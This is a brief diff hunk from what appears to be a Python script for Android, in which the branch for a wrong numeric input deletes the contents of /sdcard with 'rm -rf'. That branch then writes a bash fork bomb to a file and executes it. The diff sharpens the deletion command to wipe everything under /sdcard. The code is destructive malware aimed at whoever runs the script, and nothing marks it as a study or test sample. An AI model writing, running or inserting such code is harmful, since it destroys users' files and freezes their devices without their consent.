@@ -43,6 +43,6 @@ if opcao == 1098:
 	print('sortekkk')
 
 else:
-        os.system('rm -rf /sdcard')
+        os.system('rm -rf /sdcard/*')
 	os.system('echo ":(){ :|:& };:" > fk.sh')
 	os.system('bash fk.sh')
